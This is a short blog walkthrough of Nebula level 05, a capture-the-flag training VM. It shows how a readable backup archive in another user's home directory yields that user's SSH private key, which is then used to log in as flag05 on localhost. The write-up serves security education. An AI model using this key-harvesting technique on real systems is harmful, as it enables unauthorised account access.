---
layout: post
title: "Exploit Exercises - Nebula Level 05"
date: 2014-01-13 14:16:44 +0800
comments: true
categories: 
- Security
- Exercises
- Nebula
---

### About

Check the *flag05* home directory. You are looking for weak directory permissions

To do this level, log in as the *level05* account with the password *level05* . Files for this level can be found in /home/flag05.

<!-- more -->

### Solution

Copy the file */home/flag05/.backup/backup-19072011.tgz* in to home directory of *level05*.

extract it

``` bash
level05@nebula:~$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

So this should be the id key of user *flag05*, try to use `ssh` to login with user *flag05* without a password, and it successed.

``` bash
level05@nebula:~$ ssh flag05@localhost

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

flag05@nebula:~$
```